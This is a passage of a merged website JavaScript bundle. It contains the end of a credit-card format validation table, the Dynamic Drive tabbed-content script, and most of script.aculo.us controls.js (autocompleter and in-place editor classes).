    'VI': [new RegExp('^4[0-9]{12}([0-9]{3})?$'), new RegExp('^[0-9]{3}$'), true],
    'MC': [new RegExp('^5[1-5][0-9]{14}$'), new RegExp('^[0-9]{3}$'), true],
    'AE': [new RegExp('^3[47][0-9]{13}$'), new RegExp('^[0-9]{4}$'), true],
    'DI': [new RegExp('^6011[0-9]{12}$'), new RegExp('^[0-9]{3}$'), true],
    'JCB': [new RegExp('^(3[0-9]{15}|(2131|1800)[0-9]{11})$'), new RegExp('^[0-9]{4}$'), true],
    'OT': [false, new RegExp('^([0-9]{3}|[0-9]{4})?$'), false]
});

//** Tab Content script v2.0- � Dynamic Drive DHTML code library (http://www.dynamicdrive.com)
//** Updated Oct 7th, 07 to version 2.0. Contains numerous improvements:
//   -Added Auto Mode: Script auto rotates the tabs based on an interval, until a tab is explicitly selected
//   -Ability to expand/contract arbitrary DIVs on the page as the tabbed content is expanded/ contracted
//   -Ability to dynamically select a tab either based on its position within its peers, or its ID attribute (give the target tab one 1st)
//   -Ability to set where the CSS classname "selected" get assigned- either to the target tab's link ("A"), or its parent container
//** Updated Feb 18th, 08 to version 2.1: Adds a "tabinstance.cycleit(dir)" method to cycle forward or backward between tabs dynamically
//** Updated April 8th, 08 to version 2.2: Adds support for expanding a tab using a URL parameter (ie: http://mysite.com/tabcontent.htm?tabinterfaceid=0) 

////NO NEED TO EDIT BELOW////////////////////////

function ddtabcontent(tabinterfaceid){
	this.tabinterfaceid=tabinterfaceid //ID of Tab Menu main container
	this.tabs=document.getElementById(tabinterfaceid).getElementsByTagName("a") //Get all tab links within container
	this.enabletabpersistence=true
	this.hottabspositions=[] //Array to store position of tabs that have a "rel" attr defined, relative to all tab links, within container
	this.currentTabIndex=0 //Index of currently selected hot tab (tab with sub content) within hottabspositions[] array
	this.subcontentids=[] //Array to store ids of the sub contents ("rel" attr values)
	this.revcontentids=[] //Array to store ids of arbitrary contents to expand/contact as well ("rev" attr values)
	this.selectedClassTarget="link" //keyword to indicate which target element to assign "selected" CSS class ("linkparent" or "link")
}

ddtabcontent.getCookie=function(Name){ 
	var re=new RegExp(Name+"=[^;]+", "i"); //construct RE to search for target name/value pair
	if (document.cookie.match(re)) //if cookie found
		return document.cookie.match(re)[0].split("=")[1] //return its value
	return ""
}

ddtabcontent.setCookie=function(name, value){
	document.cookie = name+"="+value+";path=/" //cookie value is domain wide (path=/)
}

ddtabcontent.prototype={

	expandit:function(tabid_or_position){ //PUBLIC function to select a tab either by its ID or position(int) within its peers
		this.cancelautorun() //stop auto cycling of tabs (if running)
		var tabref=""
		try{
			if (typeof tabid_or_position=="string" && document.getElementById(tabid_or_position).getAttribute("rel")) //if specified tab contains "rel" attr
				tabref=document.getElementById(tabid_or_position)
			else if (parseInt(tabid_or_position)!=NaN && this.tabs[tabid_or_position].getAttribute("rel")) //if specified tab contains "rel" attr
				tabref=this.tabs[tabid_or_position]
		}
		catch(err){alert("Invalid Tab ID or position entered!")}
		if (tabref!="") //if a valid tab is found based on function parameter
			this.expandtab(tabref) //expand this tab
	},

	cycleit:function(dir, autorun){ //PUBLIC function to move foward or backwards through each hot tab (tabinstance.cycleit('foward/back') )
		if (dir=="next"){
			var currentTabIndex=(this.currentTabIndex<this.hottabspositions.length-1)? this.currentTabIndex+1 : 0
		}
		else if (dir=="prev"){
			var currentTabIndex=(this.currentTabIndex>0)? this.currentTabIndex-1 : this.hottabspositions.length-1
		}
		if (typeof autorun=="undefined") //if cycleit() is being called by user, versus autorun() function
			this.cancelautorun() //stop auto cycling of tabs (if running)
		this.expandtab(this.tabs[this.hottabspositions[currentTabIndex]])
	},

	setpersist:function(bool){ //PUBLIC function to toggle persistence feature
			this.enabletabpersistence=bool
	},

	setselectedClassTarget:function(objstr){ //PUBLIC function to set which target element to assign "selected" CSS class ("linkparent" or "link")
		this.selectedClassTarget=objstr || "link"
	},

	getselectedClassTarget:function(tabref){ //Returns target element to assign "selected" CSS class to
		return (this.selectedClassTarget==("linkparent".toLowerCase()))? tabref.parentNode : tabref
	},

	urlparamselect:function(tabinterfaceid){
		var result=window.location.search.match(new RegExp(tabinterfaceid+"=(\\d+)", "i")) //check for "?tabinterfaceid=2" in URL
		return (result==null)? null : parseInt(RegExp.$1) //returns null or index, where index (int) is the selected tab's index
	},

	expandtab:function(tabref){
		var subcontentid=tabref.getAttribute("rel") //Get id of subcontent to expand
		//Get "rev" attr as a string of IDs in the format ",john,george,trey,etc," to easily search through
		var associatedrevids=(tabref.getAttribute("rev"))? ","+tabref.getAttribute("rev").replace(/\s+/, "")+"," : ""
		this.expandsubcontent(subcontentid)
		this.expandrevcontent(associatedrevids)
		for (var i=0; i<this.tabs.length; i++){ //Loop through all tabs, and assign only the selected tab the CSS class "selected"
			this.getselectedClassTarget(this.tabs[i]).className=(this.tabs[i].getAttribute("rel")==subcontentid)? "selected" : ""
		}
		if (this.enabletabpersistence) //if persistence enabled, save selected tab position(int) relative to its peers
			ddtabcontent.setCookie(this.tabinterfaceid, tabref.tabposition)
		this.setcurrenttabindex(tabref.tabposition) //remember position of selected tab within hottabspositions[] array
	},

	expandsubcontent:function(subcontentid){
		for (var i=0; i<this.subcontentids.length; i++){
			var subcontent=document.getElementById(this.subcontentids[i]) //cache current subcontent obj (in for loop)
			subcontent.style.display=(subcontent.id==subcontentid)? "block" : "none" //"show" or hide sub content based on matching id attr value
		}
	},

	expandrevcontent:function(associatedrevids){
		var allrevids=this.revcontentids
		for (var i=0; i<allrevids.length; i++){ //Loop through rev attributes for all tabs in this tab interface
			//if any values stored within associatedrevids matches one within allrevids, expand that DIV, otherwise, contract it
			document.getElementById(allrevids[i]).style.display=(associatedrevids.indexOf(","+allrevids[i]+",")!=-1)? "block" : "none"
		}
	},

	setcurrenttabindex:function(tabposition){ //store current position of tab (within hottabspositions[] array)
		for (var i=0; i<this.hottabspositions.length; i++){
			if (tabposition==this.hottabspositions[i]){
				this.currentTabIndex=i
				break
			}
		}
	},

	autorun:function(){ //function to auto cycle through and select tabs based on a set interval
		this.cycleit('next', true)
	},

	cancelautorun:function(){
		if (typeof this.autoruntimer!="undefined")
			clearInterval(this.autoruntimer)
	},

	init:function(automodeperiod){
		var persistedtab=ddtabcontent.getCookie(this.tabinterfaceid) //get position of persisted tab (applicable if persistence is enabled)
		var selectedtab=-1 //Currently selected tab index (-1 meaning none)
		var selectedtabfromurl=this.urlparamselect(this.tabinterfaceid) //returns null or index from: tabcontent.htm?tabinterfaceid=index
		this.automodeperiod=automodeperiod || 0
		for (var i=0; i<this.tabs.length; i++){
			this.tabs[i].tabposition=i //remember position of tab relative to its peers
			if (this.tabs[i].getAttribute("rel")){
				var tabinstance=this
				this.hottabspositions[this.hottabspositions.length]=i //store position of "hot" tab ("rel" attr defined) relative to its peers
				this.subcontentids[this.subcontentids.length]=this.tabs[i].getAttribute("rel") //store id of sub content ("rel" attr value)
				this.tabs[i].onclick=function(){
					tabinstance.expandtab(this)
					tabinstance.cancelautorun() //stop auto cycling of tabs (if running)
					return false
				}
				if (this.tabs[i].getAttribute("rev")){ //if "rev" attr defined, store each value within "rev" as an array element
					this.revcontentids=this.revcontentids.concat(this.tabs[i].getAttribute("rev").split(/\s*,\s*/))
				}
				if (selectedtabfromurl==i || this.enabletabpersistence && selectedtab==-1 && parseInt(persistedtab)==i || !this.enabletabpersistence && selectedtab==-1 && this.getselectedClassTarget(this.tabs[i]).className=="selected"){
					selectedtab=i //Selected tab index, if found
				}
			}
		} //END for loop
		if (selectedtab!=-1) //if a valid default selected tab index is found
			this.expandtab(this.tabs[selectedtab]) //expand selected tab (either from URL parameter, persistent feature, or class="selected" class)
		else //if no valid default selected index found
			this.expandtab(this.tabs[this.hottabspositions[0]]) //Just select first tab that contains a "rel" attr
		if (parseInt(this.automodeperiod)>500 && this.hottabspositions.length>1){
			this.autoruntimer=setInterval(function(){tabinstance.autorun()}, this.automodeperiod)
		}
	} //END int() function

} //END Prototype assignment
// script.aculo.us controls.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
//           (c) 2005-2008 Ivan Krstic (http://blogs.law.harvard.edu/ivan)
//           (c) 2005-2008 Jon Tirsen (http://www.tirsen.com)
// Contributors:
//  Richard Livsey
//  Rahul Bhargava
//  Rob Wills
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

// Autocompleter.Base handles all the autocompletion functionality
// that's independent of the data source for autocompletion. This
// includes drawing the autocompletion menu, observing keyboard
// and mouse events, and similar.
//
// Specific autocompleters need to provide, at the very least,
// a getUpdatedChoices function that will be invoked every time
// the text inside the monitored textbox changes. This method
// should get the text for which to provide autocompletion by
// invoking this.getToken(), NOT by directly accessing
// this.element.value. This is to allow incremental tokenized
// autocompletion. Specific auto-completion logic (AJAX, etc)
// belongs in getUpdatedChoices.
//
// Tokenized incremental autocompletion is enabled automatically
// when an autocompleter is instantiated with the 'tokens' option
// in the options parameter, e.g.:
// new Ajax.Autocompleter('id','upd', '/url/', { tokens: ',' });
// will incrementally autocomplete with a comma as the token.
// Additionally, ',' in the above example can be replaced with
// a token array, e.g. { tokens: [',', '\n'] } which
// enables autocompletion on multiple tokens. This is most
// useful when one of the tokens is \n (a newline), as it
// allows smart autocompletion after linebreaks.

if(typeof Effect == 'undefined')
  throw("controls.js requires including script.aculo.us' effects.js library");

var Autocompleter = { };
Autocompleter.Base = Class.create({
  baseInitialize: function(element, update, options) {
    element          = $(element);
    this.element     = element;
    this.update      = $(update);
    this.hasFocus    = false;
    this.changed     = false;
    this.active      = false;
    this.index       = 0;
    this.entryCount  = 0;
    this.oldElementValue = this.element.value;

    if(this.setOptions)
      this.setOptions(options);
    else
      this.options = options || { };

    this.options.paramName    = this.options.paramName || this.element.name;
    this.options.tokens       = this.options.tokens || [];
    this.options.frequency    = this.options.frequency || 0.4;
    this.options.minChars     = this.options.minChars || 1;
    this.options.onShow       = this.options.onShow ||
      function(element, update){
        if(!update.style.position || update.style.position=='absolute') {
          update.style.position = 'absolute';
          Position.clone(element, update, {
            setHeight: false,
            offsetTop: element.offsetHeight
          });
        }
        Effect.Appear(update,{duration:0.15});
      };
    this.options.onHide = this.options.onHide ||
      function(element, update){ new Effect.Fade(update,{duration:0.15}) };

    if(typeof(this.options.tokens) == 'string')
      this.options.tokens = new Array(this.options.tokens);
    // Force carriage returns as token delimiters anyway
    if (!this.options.tokens.include('\n'))
      this.options.tokens.push('\n');

    this.observer = null;

    this.element.setAttribute('autocomplete','off');

    Element.hide(this.update);

    Event.observe(this.element, 'blur', this.onBlur.bindAsEventListener(this));
    Event.observe(this.element, 'keydown', this.onKeyPress.bindAsEventListener(this));
  },

  show: function() {
    if(Element.getStyle(this.update, 'display')=='none') this.options.onShow(this.element, this.update);
    if(!this.iefix &&
      (Prototype.Browser.IE) &&
      (Element.getStyle(this.update, 'position')=='absolute')) {
      new Insertion.After(this.update,
       '<iframe id="' + this.update.id + '_iefix" '+
       'style="display:none;position:absolute;filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0);" ' +
       'src="javascript:false;" frameborder="0" scrolling="no"></iframe>');
      this.iefix = $(this.update.id+'_iefix');
    }
    if(this.iefix) setTimeout(this.fixIEOverlapping.bind(this), 50);
  },

  fixIEOverlapping: function() {
    Position.clone(this.update, this.iefix, {setTop:(!this.update.style.height)});
    this.iefix.style.zIndex = 1;
    this.update.style.zIndex = 2;
    Element.show(this.iefix);
  },

  hide: function() {
    this.stopIndicator();
    if(Element.getStyle(this.update, 'display')!='none') this.options.onHide(this.element, this.update);
    if(this.iefix) Element.hide(this.iefix);
  },

  startIndicator: function() {
    if(this.options.indicator) Element.show(this.options.indicator);
  },

  stopIndicator: function() {
    if(this.options.indicator) Element.hide(this.options.indicator);
  },

  onKeyPress: function(event) {
    if(this.active)
      switch(event.keyCode) {
       case Event.KEY_TAB:
       case Event.KEY_RETURN:
         this.selectEntry();
         Event.stop(event);
       case Event.KEY_ESC:
         this.hide();
         this.active = false;
         Event.stop(event);
         return;
       case Event.KEY_LEFT:
       case Event.KEY_RIGHT:
         return;
       case Event.KEY_UP:
         this.markPrevious();
         this.render();
         Event.stop(event);
         return;
       case Event.KEY_DOWN:
         this.markNext();
         this.render();
         Event.stop(event);
         return;
      }
     else
       if(event.keyCode==Event.KEY_TAB || event.keyCode==Event.KEY_RETURN ||
         (Prototype.Browser.WebKit > 0 && event.keyCode == 0)) return;

    this.changed = true;
    this.hasFocus = true;

    if(this.observer) clearTimeout(this.observer);
      this.observer =
        setTimeout(this.onObserverEvent.bind(this), this.options.frequency*1000);
  },

  activate: function() {
    this.changed = false;
    this.hasFocus = true;
    this.getUpdatedChoices();
  },

  onHover: function(event) {
    var element = Event.findElement(event, 'LI');
    if(this.index != element.autocompleteIndex)
    {
        this.index = element.autocompleteIndex;
        this.render();
    }
    Event.stop(event);
  },

  onClick: function(event) {
    var element = Event.findElement(event, 'LI');
    this.index = element.autocompleteIndex;
    this.selectEntry();
    this.hide();
  },

  onBlur: function(event) {
    // needed to make click events working
    setTimeout(this.hide.bind(this), 250);
    this.hasFocus = false;
    this.active = false;
  },

  render: function() {
    if(this.entryCount > 0) {
      for (var i = 0; i < this.entryCount; i++)
        this.index==i ?
          Element.addClassName(this.getEntry(i),"selected") :
          Element.removeClassName(this.getEntry(i),"selected");
      if(this.hasFocus) {
        this.show();
        this.active = true;
      }
    } else {
      this.active = false;
      this.hide();
    }
  },

  markPrevious: function() {
    if(this.index > 0) this.index--;
      else this.index = this.entryCount-1;
    //this.getEntry(this.index).scrollIntoView(true); useless
  },

  markNext: function() {
    if(this.index < this.entryCount-1) this.index++;
      else this.index = 0;
    this.getEntry(this.index).scrollIntoView(false);
  },

  getEntry: function(index) {
    return this.update.firstChild.childNodes[index];
  },

  getCurrentEntry: function() {
    return this.getEntry(this.index);
  },

  selectEntry: function() {
    this.active = false;
    this.updateElement(this.getCurrentEntry());
  },

  updateElement: function(selectedElement) {
    if (this.options.updateElement) {
      this.options.updateElement(selectedElement);
      return;
    }
    var value = '';
    if (this.options.select) {
      var nodes = $(selectedElement).select('.' + this.options.select) || [];
      if(nodes.length>0) value = Element.collectTextNodes(nodes[0], this.options.select);
    } else
      value = Element.collectTextNodesIgnoreClass(selectedElement, 'informal');

    var bounds = this.getTokenBounds();
    if (bounds[0] != -1) {
      var newValue = this.element.value.substr(0, bounds[0]);
      var whitespace = this.element.value.substr(bounds[0]).match(/^\s+/);
      if (whitespace)
        newValue += whitespace[0];
      this.element.value = newValue + value + this.element.value.substr(bounds[1]);
    } else {
      this.element.value = value;
    }
    this.oldElementValue = this.element.value;
    this.element.focus();

    if (this.options.afterUpdateElement)
      this.options.afterUpdateElement(this.element, selectedElement);
  },

  updateChoices: function(choices) {
    if(!this.changed && this.hasFocus) {
      this.update.innerHTML = choices;
      Element.cleanWhitespace(this.update);
      Element.cleanWhitespace(this.update.down());

      if(this.update.firstChild && this.update.down().childNodes) {
        this.entryCount =
          this.update.down().childNodes.length;
        for (var i = 0; i < this.entryCount; i++) {
          var entry = this.getEntry(i);
          entry.autocompleteIndex = i;
          this.addObservers(entry);
        }
      } else {
        this.entryCount = 0;
      }

      this.stopIndicator();
      this.index = 0;

      if(this.entryCount==1 && this.options.autoSelect) {
        this.selectEntry();
        this.hide();
      } else {
        this.render();
      }
    }
  },

  addObservers: function(element) {
    Event.observe(element, "mouseover", this.onHover.bindAsEventListener(this));
    Event.observe(element, "click", this.onClick.bindAsEventListener(this));
  },

  onObserverEvent: function() {
    this.changed = false;
    this.tokenBounds = null;
    if(this.getToken().length>=this.options.minChars) {
      this.getUpdatedChoices();
    } else {
      this.active = false;
      this.hide();
    }
    this.oldElementValue = this.element.value;
  },

  getToken: function() {
    var bounds = this.getTokenBounds();
    return this.element.value.substring(bounds[0], bounds[1]).strip();
  },

  getTokenBounds: function() {
    if (null != this.tokenBounds) return this.tokenBounds;
    var value = this.element.value;
    if (value.strip().empty()) return [-1, 0];
    var diff = arguments.callee.getFirstDifferencePos(value, this.oldElementValue);
    var offset = (diff == this.oldElementValue.length ? 1 : 0);
    var prevTokenPos = -1, nextTokenPos = value.length;
    var tp;
    for (var index = 0, l = this.options.tokens.length; index < l; ++index) {
      tp = value.lastIndexOf(this.options.tokens[index], diff + offset - 1);
      if (tp > prevTokenPos) prevTokenPos = tp;
      tp = value.indexOf(this.options.tokens[index], diff + offset);
      if (-1 != tp && tp < nextTokenPos) nextTokenPos = tp;
    }
    return (this.tokenBounds = [prevTokenPos + 1, nextTokenPos]);
  }
});

Autocompleter.Base.prototype.getTokenBounds.getFirstDifferencePos = function(newS, oldS) {
  var boundary = Math.min(newS.length, oldS.length);
  for (var index = 0; index < boundary; ++index)
    if (newS[index] != oldS[index])
      return index;
  return boundary;
};

Ajax.Autocompleter = Class.create(Autocompleter.Base, {
  initialize: function(element, update, url, options) {
    this.baseInitialize(element, update, options);
    this.options.asynchronous  = true;
    this.options.onComplete    = this.onComplete.bind(this);
    this.options.defaultParams = this.options.parameters || null;
    this.url                   = url;
  },

  getUpdatedChoices: function() {
    this.startIndicator();

    var entry = encodeURIComponent(this.options.paramName) + '=' +
      encodeURIComponent(this.getToken());

    this.options.parameters = this.options.callback ?
      this.options.callback(this.element, entry) : entry;

    if(this.options.defaultParams)
      this.options.parameters += '&' + this.options.defaultParams;

    new Ajax.Request(this.url, this.options);
  },

  onComplete: function(request) {
    this.updateChoices(request.responseText);
  }
});

// The local array autocompleter. Used when you'd prefer to
// inject an array of autocompletion options into the page, rather
// than sending out Ajax queries, which can be quite slow sometimes.
//
// The constructor takes four parameters. The first two are, as usual,
// the id of the monitored textbox, and id of the autocompletion menu.
// The third is the array you want to autocomplete from, and the fourth
// is the options block.
//
// Extra local autocompletion options:
// - choices - How many autocompletion choices to offer
//
// - partialSearch - If false, the autocompleter will match entered
//                    text only at the beginning of strings in the
//                    autocomplete array. Defaults to true, which will
//                    match text at the beginning of any *word* in the
//                    strings in the autocomplete array. If you want to
//                    search anywhere in the string, additionally set
//                    the option fullSearch to true (default: off).
//
// - fullSsearch - Search anywhere in autocomplete array strings.
//
// - partialChars - How many characters to enter before triggering
//                   a partial match (unlike minChars, which defines
//                   how many characters are required to do any match
//                   at all). Defaults to 2.
//
// - ignoreCase - Whether to ignore case when autocompleting.
//                 Defaults to true.
//
// It's possible to pass in a custom function as the 'selector'
// option, if you prefer to write your own autocompletion logic.
// In that case, the other options above will not apply unless
// you support them.

Autocompleter.Local = Class.create(Autocompleter.Base, {
  initialize: function(element, update, array, options) {
    this.baseInitialize(element, update, options);
    this.options.array = array;
  },

  getUpdatedChoices: function() {
    this.updateChoices(this.options.selector(this));
  },

  setOptions: function(options) {
    this.options = Object.extend({
      choices: 10,
      partialSearch: true,
      partialChars: 2,
      ignoreCase: true,
      fullSearch: false,
      selector: function(instance) {
        var ret       = []; // Beginning matches
        var partial   = []; // Inside matches
        var entry     = instance.getToken();
        var count     = 0;

        for (var i = 0; i < instance.options.array.length &&
          ret.length < instance.options.choices ; i++) {

          var elem = instance.options.array[i];
          var foundPos = instance.options.ignoreCase ?
            elem.toLowerCase().indexOf(entry.toLowerCase()) :
            elem.indexOf(entry);

          while (foundPos != -1) {
            if (foundPos == 0 && elem.length != entry.length) {
              ret.push("<li><strong>" + elem.substr(0, entry.length) + "</strong>" +
                elem.substr(entry.length) + "</li>");
              break;
            } else if (entry.length >= instance.options.partialChars &&
              instance.options.partialSearch && foundPos != -1) {
              if (instance.options.fullSearch || /\s/.test(elem.substr(foundPos-1,1))) {
                partial.push("<li>" + elem.substr(0, foundPos) + "<strong>" +
                  elem.substr(foundPos, entry.length) + "</strong>" + elem.substr(
                  foundPos + entry.length) + "</li>");
                break;
              }
            }

            foundPos = instance.options.ignoreCase ?
              elem.toLowerCase().indexOf(entry.toLowerCase(), foundPos + 1) :
              elem.indexOf(entry, foundPos + 1);

          }
        }
        if (partial.length)
          ret = ret.concat(partial.slice(0, instance.options.choices - ret.length));
        return "<ul>" + ret.join('') + "</ul>";
      }
    }, options || { });
  }
});

// AJAX in-place editor and collection editor
// Full rewrite by Christophe Porteneuve <tdd@tddsworld.com> (April 2007).

// Use this if you notice weird scrolling problems on some browsers,
// the DOM might be a bit confused when this gets called so do this
// waits 1 ms (with setTimeout) until it does the activation
Field.scrollFreeActivate = function(field) {
  setTimeout(function() {
    Field.activate(field);
  }, 1);
};

Ajax.InPlaceEditor = Class.create({
  initialize: function(element, url, options) {
    this.url = url;
    this.element = element = $(element);
    this.prepareOptions();
    this._controls = { };
    arguments.callee.dealWithDeprecatedOptions(options); // DEPRECATION LAYER!!!
    Object.extend(this.options, options || { });
    if (!this.options.formId && this.element.id) {
      this.options.formId = this.element.id + '-inplaceeditor';
      if ($(this.options.formId))
        this.options.formId = '';
    }
    if (this.options.externalControl)
      this.options.externalControl = $(this.options.externalControl);
    if (!this.options.externalControl)
      this.options.externalControlOnly = false;
    this._originalBackground = this.element.getStyle('background-color') || 'transparent';
    this.element.title = this.options.clickToEditText;
    this._boundCancelHandler = this.handleFormCancellation.bind(this);
    this._boundComplete = (this.options.onComplete || Prototype.emptyFunction).bind(this);
    this._boundFailureHandler = this.handleAJAXFailure.bind(this);
    this._boundSubmitHandler = this.handleFormSubmission.bind(this);
    this._boundWrapperHandler = this.wrapUp.bind(this);
    this.registerListeners();
  },
  checkForEscapeOrReturn: function(e) {
    if (!this._editing || e.ctrlKey || e.altKey || e.shiftKey) return;
    if (Event.KEY_ESC == e.keyCode)
      this.handleFormCancellation(e);
    else if (Event.KEY_RETURN == e.keyCode)
      this.handleFormSubmission(e);
  },
  createControl: function(mode, handler, extraClasses) {
    var control = this.options[mode + 'Control'];
    var text = this.options[mode + 'Text'];
    if ('button' == control) {
      var btn = document.createElement('input');
      btn.type = 'submit';
      btn.value = text;
      btn.className = 'editor_' + mode + '_button';
      if ('cancel' == mode)
        btn.onclick = this._boundCancelHandler;
      this._form.appendChild(btn);
      this._controls[mode] = btn;
    } else if ('link' == control) {
      var link = document.createElement('a');
      link.href = '#';
      link.appendChild(document.createTextNode(text));
      link.onclick = 'cancel' == mode ? this._boundCancelHandler : this._boundSubmitHandler;
      link.className = 'editor_' + mode + '_link';
      if (extraClasses)
        link.className += ' ' + extraClasses;
      this._form.appendChild(link);
      this._controls[mode] = link;
    }
  },
  createEditField: function() {
    var text = (this.options.loadTextURL ? this.options.loadingText : this.getText());
    var fld;
    if (1 >= this.options.rows && !/\r|\n/.test(this.getText())) {
      fld = document.createElement('input');
      fld.type = 'text';
      var size = this.options.size || this.options.cols || 0;
      if (0 < size) fld.size = size;
    } else {
      fld = document.createElement('textarea');
      fld.rows = (1 >= this.options.rows ? this.options.autoRows : this.options.rows);
      fld.cols = this.options.cols || 40;
    }
    fld.name = this.options.paramName;
    fld.value = text; // No HTML breaks conversion anymore
    fld.className = 'editor_field';
    if (this.options.submitOnBlur)
      fld.onblur = this._boundSubmitHandler;
    this._controls.editor = fld;
    if (this.options.loadTextURL)
      this.loadExternalText();
    this._form.appendChild(this._controls.editor);
  },
  createForm: function() {
    var ipe = this;
    function addText(mode, condition) {
      var text = ipe.options['text' + mode + 'Controls'];
      if (!text || condition === false) return;
      ipe._form.appendChild(document.createTextNode(text));
    };
    this._form = $(document.createElement('form'));
    this._form.id = this.options.formId;
    this._form.addClassName(this.options.formClassName);
    this._form.onsubmit = this._boundSubmitHandler;
    this.createEditField();
    if ('textarea' == this._controls.editor.tagName.toLowerCase())
      this._form.appendChild(document.createElement('br'));
    if (this.options.onFormCustomization)
      this.options.onFormCustomization(this, this._form);
    addText('Before', this.options.okControl || this.options.cancelControl);
    this.createControl('ok', this._boundSubmitHandler);
    addText('Between', this.options.okControl && this.options.cancelControl);
    this.createControl('cancel', this._boundCancelHandler, 'editor_cancel');
    addText('After', this.options.okControl || this.options.cancelControl);
  },
  destroy: function() {
    if (this._oldInnerHTML)
      this.element.innerHTML = this._oldInnerHTML;
    this.leaveEditMode();
    this.unregisterListeners();
  },
  enterEditMode: function(e) {
    if (this._saving || this._editing) return;
    this._editing = true;
    this.triggerCallback('onEnterEditMode');
    if (this.options.externalControl)
      this.options.externalControl.hide();
    this.element.hide();
    this.createForm();
    this.element.parentNode.insertBefore(this._form, this.element);
    if (!this.options.loadTextURL)
      this.postProcessEditField();
    if (e) Event.stop(e);
  },
  enterHover: function(e) {
    if (this.options.hoverClassName)
      this.element.addClassName(this.options.hoverClassName);
    if (this._saving) return;
    this.triggerCallback('onEnterHover');
  },
  getText: function() {
    return this.element.innerHTML.unescapeHTML();
  },
  handleAJAXFailure: function(transport) {
    this.triggerCallback('onFailure', transport);
    if (this._oldInnerHTML) {
      this.element.innerHTML = this._oldInnerHTML;
      this._oldInnerHTML = null;
    }
  },
  handleFormCancellation: function(e) {
    this.wrapUp();
    if (e) Event.stop(e);
  },
  handleFormSubmission: function(e) {
    var form = this._form;
    var value = $F(this._controls.editor);
    this.prepareSubmission();
    var params = this.options.callback(form, value) || '';
    if (Object.isString(params))
      params = params.toQueryParams();
    params.editorId = this.element.id;
    if (this.options.htmlResponse) {
      var options = Object.extend({ evalScripts: true }, this.options.ajaxOptions);
      Object.extend(options, {
        parameters: params,
        onComplete: this._boundWrapperHandler,
        onFailure: this._boundFailureHandler
      });
      new Ajax.Updater({ success: this.element }, this.url, options);
    } else {
      var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
      Object.extend(options, {
        parameters: params,
        onComplete: this._boundWrapperHandler,
        onFailure: this._boundFailureHandler
      });
      new Ajax.Request(this.url, options);
    }
    if (e) Event.stop(e);
  },
  leaveEditMode: function() {
    this.element.removeClassName(this.options.savingClassName);
    this.removeForm();
    this.leaveHover();
    this.element.style.backgroundColor = this._originalBackground;
    this.element.show();
    if (this.options.externalControl)
      this.options.externalControl.show();
    this._saving = false;
    this._editing = false;
    this._oldInnerHTML = null;
    this.triggerCallback('onLeaveEditMode');
  },
  leaveHover: function(e) {
    if (this.options.hoverClassName)
      this.element.removeClassName(this.options.hoverClassName);
    if (this._saving) return;
    this.triggerCallback('onLeaveHover');
  },
  loadExternalText: function() {
    this._form.addClassName(this.options.loadingClassName);
    this._controls.editor.disabled = true;
    var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
    Object.extend(options, {
      parameters: 'editorId=' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        this._form.removeClassName(this.options.loadingClassName);
        var text = transport.responseText;
        if (this.options.stripLoadedTextTags)
          text = text.stripTags();
        this._controls.editor.value = text;
        this._controls.editor.disabled = false;
        this.postProcessEditField();
      }.bind(this),
      onFailure: this._boundFailureHandler
    });
    new Ajax.Request(this.options.loadTextURL, options);
  },
  postProcessEditField: function() {
    var fpc = this.options.fieldPostCreation;
    if (fpc)
      $(this._controls.editor)['focus' == fpc ? 'focus' : 'activate']();
  },
  prepareOptions: function() {
    this.options = Object.clone(Ajax.InPlaceEditor.DefaultOptions);
    Object.extend(this.options, Ajax.InPlaceEditor.DefaultCallbacks);
    [this._extraDefaultOptions].flatten().compact().each(function(defs) {
      Object.extend(this.options, defs);
    }.bind(this));
  },
  prepareSubmission: function() {
    this._saving = true;
    this.removeForm();
    this.leaveHover();
    this.showSaving();
  },
  registerListeners: function() {
    this._listeners = { };
    var listener;
    $H(Ajax.InPlaceEditor.Listeners).each(function(pair) {
      listener = this[pair.value].bind(this);
      this._listeners[pair.key] = listener;
      if (!this.options.externalControlOnly)
        this.element.observe(pair.key, listener);
      if (this.options.externalControl)
        this.options.externalControl.observe(pair.key, listener);
    }.bind(this));
  },
  removeForm: function() {
    if (!this._form) return;
    this._form.remove();
    this._form = null;
    this._controls = { };
  },
  showSaving: function() {
    this._oldInnerHTML = this.element.innerHTML;
    this.element.innerHTML = this.options.savingText;
    this.element.addClassName(this.options.savingClassName);
    this.element.style.backgroundColor = this._originalBackground;
    this.element.show();
  },
  triggerCallback: function(cbName, arg) {
    if ('function' == typeof this.options[cbName]) {
      this.options[cbName](this, arg);
    }
  },
  unregisterListeners: function() {
    $H(this._listeners).each(function(pair) {
      if (!this.options.externalControlOnly)
        this.element.stopObserving(pair.key, pair.value);
      if (this.options.externalControl)
        this.options.externalControl.stopObserving(pair.key, pair.value);
    }.bind(this));
  },
  wrapUp: function(transport) {
    this.leaveEditMode();
    // Can't use triggerCallback due to backward compatibility: requires
    // binding + direct element
    this._boundComplete(transport, this.element);
  }
});

Object.extend(Ajax.InPlaceEditor.prototype, {
  dispose: Ajax.InPlaceEditor.prototype.destroy
});

Ajax.InPlaceCollectionEditor = Class.create(Ajax.InPlaceEditor, {
  initialize: function($super, element, url, options) {
    this._extraDefaultOptions = Ajax.InPlaceCollectionEditor.DefaultOptions;
    $super(element, url, options);
  },

  createEditField: function() {
    var list = document.createElement('select');
    list.name = this.options.paramName;
    list.size = 1;
    this._controls.editor = list;
    this._collection = this.options.collection || [];
    if (this.options.loadCollectionURL)
      this.loadCollection();
    else
      this.checkForExternalText();
    this._form.appendChild(this._controls.editor);
  },

  loadCollection: function() {
    this._form.addClassName(this.options.loadingClassName);
    this.showLoadingText(this.options.loadingCollectionText);
    var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
    Object.extend(options, {
      parameters: 'editorId=' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        var js = transport.responseText.strip();
        if (!/^\[.*\]$/.test(js)) // TODO: improve sanity check
          throw('Server returned an invalid collection representation.');
        this._collection = eval(js);
        this.checkForExternalText();
      }.bind(this),
      onFailure: this.onFailure
    });
    new Ajax.Request(this.options.loadCollectionURL, options);
  },

